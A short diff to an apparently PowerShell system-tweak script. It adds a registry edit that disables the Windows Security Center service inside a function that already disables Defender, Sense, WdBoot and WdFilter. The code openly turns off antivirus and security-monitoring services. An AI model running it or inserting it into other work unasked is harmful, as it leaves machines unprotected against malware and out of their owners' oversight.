@@ -75,6 +75,7 @@ Function Remove-ACL {
 function Disable-Windows-Defender {
     try {
         Set-ItemProperty -Path "HKLM:\SYSTEM\ControlSet001\Services\WinDefend" -Name "Start" -Value 4 -force | out-null
+        Set-ItemProperty -Path "HKLM:\SYSTEM\ControlSet001\Services\wscsvc" -Name "Start" -Value 4 -force | out-null
         Set-ItemProperty -Path "HKLM:\SYSTEM\ControlSet001\Services\Sense" -Name "Start" -Value 4 -force | out-null
         Set-ItemProperty -Path "HKLM:\SYSTEM\ControlSet001\Services\WdBoot" -Name "Start" -Value 4 -force | out-null
         Set-ItemProperty -Path "HKLM:\SYSTEM\ControlSet001\Services\WdFilter" -Name "Start" -Value 4 -force | out-null
